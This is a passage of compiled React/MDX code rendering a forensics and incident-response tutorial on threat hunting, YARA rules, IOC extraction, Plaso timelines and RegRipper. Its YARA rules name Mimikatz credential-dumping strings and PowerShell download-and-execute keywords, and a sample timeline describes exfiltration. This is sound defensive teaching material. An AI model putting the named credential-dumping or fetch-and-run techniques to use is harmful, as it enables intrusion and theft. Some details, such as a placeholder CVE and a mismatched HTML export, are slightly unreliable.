      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "I need to pass a compliance audit (PCI DSS, SOC 2)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "My analysts spend 80% of time on repetitive tasks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOAR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "I need endpoint protection with built-in detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XDR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "I have 5 different security tools that don't talk to each other"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM + SOAR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "I want automated containment of malicious processes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XDR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "I need to investigate a multi-stage attack across email, endpoint, and cloud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "XDR + SIEM"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h1, {
      id: "chapter-8-forensics--incident-response-3",
      children: "Chapter 8: Forensics & Incident Response"
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "10-threat-hunting--ioc-extraction",
      children: "10. Threat Hunting & IOC Extraction"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " SIEM alerts are like a fire alarm → something is already burning. Threat hunting is a fire inspector walking through the building looking for faulty wiring, blocked sprinklers, and gas leaks BEFORE they cause a fire. You're looking for the conditions that enable security incidents, not waiting for the alarm."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "101-threat-hunting-methodology",
      children: "10.1 Threat Hunting Methodology"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "The Hypothesis-Driven Hunting Process:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Hypothesis → Data Collection → Investigation → Pattern Recognition → Response\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 1: Develop a Hypothesis"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Based on threat intelligence, recent vulnerabilities, or organizational changes"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Example: \"APT29 may have targeted our organization using the new Vecna vulnerability (CVE-2024-XYZ)\""
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 2: Collect Relevant Data"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify what logs, endpoints, and network data would confirm or disprove the hypothesis"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Example: Collect IOCs from threat intel, search endpoint process creation logs, check for specific registry keys"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 3: Investigate"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Query SIEM, inspect endpoints, analyze network traffic"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Look for anomalous patterns that match the hypothesis"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 4: Pattern Recognition"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Identify true positive findings vs false positives"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Correlate across multiple data sources"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Step 5: Respond"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If threat is found: initiate IR process, contain, eradicate"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "If not found: document the hunt, update detection rules for future visibility"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Hunting Maturity Model (HMM):"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Level"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Name"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Initial"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Relies solely on automated alerts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minimal"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Some manual investigation, no formal process"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Procedural"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hunting follows documented procedures"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Innovative"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Creates new data sources and analytics"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Leading"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automates successful hunt techniques across the organization"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "102-yara-rule-writing-for-malware-detection",
      children: "10.2 YARA Rule Writing for Malware Detection"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A YARA rule is like a \"wanted poster\" for file patterns. Just as a wanted poster describes physical features (height, eye color, tattoos), a YARA rule describes byte patterns, strings, and metadata that identify a specific malware family."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "YARA Rule Structure:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yara",
        children: "/*\n   Rule Name: Description of what this detects\n   Author: Name\n   Date: YYYY-MM-DD\n   Reference: Link to analysis\n*/\n\nrule Rule_Name : Tag1 Tag2\n{\n    meta:\n        description = \"Description of the rule\"\n        author = \"Analyst Name\"\n        date = \"2024-06-15\"\n        reference = \"https://url-to-analysis\"\n        hash = \"a8f5f167f44f4964e6c998d67f3b3b9e...\"\n\n    strings:\n        $string1 = \"malicious_string\" ascii wide nocase\n        $hex_string = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF }\n        $regex = /https?:\\/\\/[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}/\n        $byte_pattern = { E8 00 00 00 00 5D 48 81 EC 00 01 00 00 }\n\n    condition:\n        $string1 or $hex_string or $regex or $byte_pattern\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "YARA Rule Examples:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-yara",
        children: "// Cobalt Strike Beacon Detection\nrule CobaltStrike_Beacon\n{\n    meta:\n        description = \"Detects Cobalt Strike beacon artifacts\"\n        author = \"DFIR Team\"\n        reference = \"https://attack.mitre.org/software/S0154/\"\n        hash = \"e4b90e2f0c7e1a3f5d8b0c6a2e9f1d4c7b8a0e3f\"\n\n    strings:\n        $mz_header = \"MZ\"\n        $beacon_config = \"@@PIPE@@@\" ascii wide\n        $named_pipe = \"\\\\\\\\.\\\\pipe\\\\msagent_\" ascii wide\n        $named_pipe2 = \"\\\\\\\\.\\\\pipe\\\\status_\" ascii wide\n        $msself = \"MSSELF\" ascii\n        $reflective_loader = { 55 8B EC 83 EC 10 56 57 8B 75 08 8B 7D 0C }\n\n    condition:\n        $mz_header at 0 and\n        ($beacon_config or $named_pipe or $named_pipe2 or\n         $msself or $reflective_loader)\n}\n\n// Mimikatz Detection\nrule Mimikatz\n{\n    meta:\n        description = \"Detects Mimikatz credential dumping tool\"\n        author = \"DFIR Team\"\n        reference = \"https://attack.mitre.org/software/S0002/\"\n\n    strings:\n        $sekurlsa = \"sekurlsa::logonpasswords\" ascii wide\n        $mimidrv = \"mimidrv\" ascii wide\n        $kiwi = \"kiwi\" ascii wide nocase\n        $logonpass = \"logonpasswords\" ascii wide\n        $wdigest = \"wdigest\" ascii wide\n        $crypto = \"crypto::\" ascii wide\n\n    condition:\n        any of ($sekurlsa, $mimidrv, $logonpass, $kiwi) or\n        2 of ($wdigest, $crypto)\n}\n\n// PowerShell Download Cradle Detection\nrule PowerShell_DownloadCradle\n{\n    meta:\n        description = \"Detects PowerShell download cradle patterns\"\n\n    strings:\n        $downloadstring = \"DownloadString\" ascii wide nocase\n        $downloadfile = \"DownloadFile\" ascii wide nocase\n        $webclient = \"Net.WebClient\" ascii wide nocase\n        $invokeexpression = \"Invoke-Expression\" ascii wide nocase\n        $iex = \"IEX\" ascii wide nocase\n        $hidden = \"WindowStyle Hidden\" ascii wide\n        $encoded = \"-EncodedCommand\" ascii wide\n        $bypass = \"ExecutionPolicy Bypass\" ascii wide\n\n    condition:\n        $webclient and\n        ($downloadstring or $downloadfile) and\n        ($invokeexpression or $iex) and\n        ($hidden or $encoded or $bypass)\n}\n\n// Ransomware File Marker Detection\nrule Ransomware_FileMarker\n{\n    meta:\n        description = \"Detects common ransomware file markers\"\n\n    strings:\n        $lockbit = \"LOCKBIT\" ascii wide\n        $blackcat = \"ALPHV\" ascii wide nocase\n        $blackbasta = \"BLACKBASTA\" ascii wide\n        $conti = \"CONTINUE\" ascii wide nocase\n        $clop = \"CLOP\" ascii wide\n        $ransom_note = \"HOW_TO_RECOVER\" ascii wide\n\n    condition:\n        any of them\n}\n\n// C2 IP Address Pattern\nrule C2_IP_Pattern\n{\n    meta:\n        description = \"Detects suspicious IP patterns in files\"\n\n    strings:\n        $ip1 = /192\\.168\\.\\d{1,3}\\.\\d{1,3}/  // Internal IP in unexpected context\n        $port_high = /:\\d{4,5}/                 // High port numbers\n        $https_ip = /https?:\\/\\/\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/\n\n    condition:\n        #ip1 > 5 and $port_high and $https_ip\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Using YARA:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Scan a file\nyara malware_rules.yara suspicious_file.exe\n\n# Scan a directory recursively\nyara -r malware_rules.yara /evidence/extracted/\n\n# Scan a memory dump\nyara -s malware_rules.yara pid.3456.dmp\n\n# Scan with metadata output\nyara -m malware_rules.yara /evidence/carved/\n\n# YARA with external variables\nyara -d \"option=scan\" malware_rules.yara file.exe\n\n# Compile YARA rules for performance\nyarac rules.yarac rules.yara\n\n# Scan using compiled rules\nyara -C rules.yarac file.exe\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "YARA Performance Tips:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Use ", (0,jsx_runtime.jsx)(_components.code, {
          children: "$"
        }), " anchors for string position (", (0,jsx_runtime.jsx)(_components.code, {
          children: "$mz at 0"
        }), ")"]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Prefer wide/nocase modifiers over additional strings"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use reasonable condition complexity (avoid deep nesting)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Match most specific strings first"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Test rules against both malware and clean files"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "103-ioc-extraction",
      children: "10.3 IOC Extraction"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Indicators of Compromise (IOCs)"
      }), " are artifacts that indicate a system may be compromised."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ioc-types",
      children: "IOC Types"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Examples"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Extraction Source"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Persistence"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Evasion Difficulty"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Network"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IP addresses, domains, URLs, user agents"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Firewall logs, DNS logs, proxy logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low → IPs/domains change"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Easy (fast flux, CDN)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Host"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File hashes, registry keys, file paths, process names"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EDR, Sysmon, file system"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium → files can be renamed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Memory"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process injection patterns, loaded DLLs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Volatility, memory dumps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very low → lost on reboot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hard to hide from RAM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Behavioral"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Command-line patterns, network timing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM, UEBA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not directly observable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hard → requires changing behavior"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Email"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Sender addresses, subject lines, attachment names"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Email gateway, M365 logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low → easily spoofed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Easy"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Account"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Usernames, SIDs, creation times"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AD logs, auth logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ioc-extraction-commands",
      children: "IOC Extraction Commands"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Extract file hashes (SHA-256, SHA-1, MD5)\nGet-ChildItem -Recurse -Path C:\\evidence\\ | ForEach-Object {\n    $hash = (Get-FileHash -Path $_.FullName -Algorithm SHA256).Hash\n    Write-Output \"$hash | $($_.Name)\"\n} | Export-Csv -Path file_hashes.csv -NoTypeInformation\n\n# Extract network IOCs from Zeek logs\n# From conn.log:\nzeek-cut id.resp_h < conn.log | sort -u > unique_ips.txt\n\n# From dns.log:\nzeek-cut query < dns.log | sort -u > domains_queried.txt\n\n# From http.log:\nzeek-cut host uri < http.log | sort -u > http_requests.txt\n\n# Extract registry persistence locations\n# Using Autoruns (Sysinternals)\nautorunsc.exe -a -c -h > autoruns.csv\n\n# Using RegRipper\nrip.exe -r C:\\evidence\\NTUSER.DAT -f usrclass > user_assist.txt\nrip.exe -r C:\\evidence\\SYSTEM -f system > system_info.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ioc-sharing-formats-stixtaxii",
      children: "IOC Sharing Formats (STIX/TAXII)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-json",
        children: "{\n    \"type\": \"indicator\",\n    \"spec_version\": \"2.1\",\n    \"id\": \"indicator--12345678-1234-1234-1234-123456789012\",\n    \"created\": \"2024-06-15T14:30:00.000Z\",\n    \"modified\": \"2024-06-15T14:30:00.000Z\",\n    \"name\": \"Suspicious C2 IP\",\n    \"description\": \"IP address used by Cobalt Strike C2 infrastructure\",\n    \"indicator_types\": [\"malicious-activity\", \"attribution\"],\n    \"pattern\": \"[ipv4-addr:value = '185.234.72.18']\",\n    \"pattern_type\": \"stix\",\n    \"valid_from\": \"2024-06-15T14:30:00.000Z\",\n    \"kill_chain_phases\": [\n        {\n            \"kill_chain_name\": \"lockheed-martin-cyber-kill-chain\",\n            \"phase_name\": \"command-and-control\"\n        }\n    ]\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "104-plaso-log2timeline--timeline-creation",
      children: "10.4 Plaso (log2timeline) → Timeline Creation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " If the incident is a movie, Plaso creates the full storyboard showing every scene in chronological order. From the moment a file was created (scene 1) to when it was executed (scene 2) to when it connected to the C2 server (scene 3) → Plaso assembles all the frames into a single timeline."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Step 1: Create a Plaso storage file from a disk image\nlog2timeline.py \\\n    --storage-file /evidence/case-001/timeline.plaso \\\n    --partition 1 \\\n    /evidence/case-001/disk-image.dd\n\n# Step 2: Process a specific directory\nlog2timeline.py \\\n    --storage-file /evidence/case-001/timeline.plaso \\\n    /evidence/case-001/file-system-mount/\n\n# Step 3: Add multiple sources to the same timeline\nlog2timeline.py --storage-file timeline.plaso disk-image.dd\nlog2timeline.py --storage-file timeline.plaso memory.raw\nlog2timeline.py --storage-file timeline.plaso /evidence/logs/\n\n# Step 4: Export timeline to CSV\npsort.py \\\n    -w /evidence/case-001/timeline.csv \\\n    /evidence/case-001/timeline.plaso\n\n# Step 5: Filter timeline by date range\npsort.py \\\n    -w /evidence/case-001/timeline_filtered.csv \\\n    /evidence/case-001/timeline.plaso \\\n    \"date > '2024-06-14 00:00:00' AND date < '2024-06-16 00:00:00'\"\n\n# Step 6: Filter by specific event types\npsort.py \\\n    -w /evidence/case-001/timeline_executable.csv \\\n    /evidence/case-001/timeline.plaso \\\n    \"parser contains 'pe'\"\n\n# Step 7: Generate timeline report (HTML)\npsort.py \\\n    -o l2tcsv \\\n    -w /evidence/case-001/timeline.html \\\n    /evidence/case-001/timeline.plaso\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Plaso Timeline Output Example (CSV):"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "date,time,timezone,MACB,source,sourcetype,type,user,description,filename,inode,notes\n2024-06-15,14:30:00.000,UTC,MACB,FILE,NTFS,M,...A...,jdoe,File Created,Invoice_2024.docm,45,From email attachment\n2024-06-15,14:30:05.000,UTC,...B,FILE,NTFS,M,...B...,jdoe,File Modified,Invoice_2024.docm,45,Macro execution\n2024-06-15,14:30:10.000,UTC,MACB,FILE,NTFS,M,MACB,system,File Created,beacon.dll,128,Dropped by macro\n2024-06-15,14:30:12.000,UTC,....,PROC,Windows.EVTX,M,....,jdoe,Process Start,cmd.exe,3420,Parent: WINWORD.EXE\n2024-06-15,14:30:15.000,UTC,....,PROC,Windows.EVTX,M,....,jdoe,Process Start,powershell.exe,3456,Parent: cmd.exe\n2024-06-15,14:30:20.000,UTC,MACB,REG,Windows.Registry,M,...B...,system,Registry Key Modified,Run\\UpdateService,,Persistence added\n2024-06-15,14:30:25.000,UTC,....,NET,Zeek.Conn,M,....,N/A,TCP Connection,185.234.72.18:443,3456,PID 3456 initiated\n2024-06-15,14:45:00.000,UTC,....,NET,Zeek.Conn,M,....,N/A,TCP Connection,192.168.1.50:445,3456,Lateral movement - SMB\n2024-06-15,15:10:00.000,UTC,....,NET,Zeek.Conn,M,....,N/A,TCP Connection,198.51.100.50:21,3456,Data exfiltration - FTP\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "105-regripper--registry-analysis",
      children: "10.5 RegRipper → Registry Analysis"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " The Windows Registry is like the ship's logbook on the Titanic. It records every program that was ever installed (crew assignments), every USB device that was connected (port visits), every file that was opened (navigation records), and what programs run at startup (daily routines). RegRipper is the expert reading that logbook."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# RegRipper CLI usage\nrip.exe -r C:\\evidence\\NTUSER.DAT -p userassist > userassist_output.txt\nrip.exe -r C:\\evidence\\NTUSER.DAT -p typedurls > typedurls_output.txt\nrip.exe -r C:\\evidence\\NTUSER.DAT -p recently > recently_output.txt\n\n# System hive\nrip.exe -r C:\\evidence\\SYSTEM -p services > services_output.txt\nrip.exe -r C:\\evidence\\SYSTEM -p network > network_info.txt\n\n# Software hive\nrip.exe -r C:\\evidence\\SOFTWARE -p installedapps > installed_apps.txt\nrip.exe -r C:\\evidence\\SOFTWARE -p lastloggedon > last_logon.txt\n\n# SAM hive\nrip.exe -r C:\\evidence\\SAM -p samparse > user_accounts.txt\n\n# Run all plugins on a hive\nrip.exe -r C:\\evidence\\NTUSER.DAT -a > full_ntuser_analysis.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Registry Locations for Forensics:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Registry Path"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Artifact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Value"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Executed programs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shows program execution count and timestamps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recently opened documents"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File names and locations accessed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Run command history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Commands typed in Run dialog"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedURLs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "URLs typed in IE"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Typed URLs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Internet Explorer\\TypedURLsTime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Typed URLs with timestamps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "When URLs were typed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "NTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagMRU"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Shellbag data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Folder navigation history"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Installed applications"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Software inventory"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Startup programs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Persistence mechanisms"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SYSTEM\\CurrentControlSet\\Services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Windows services"
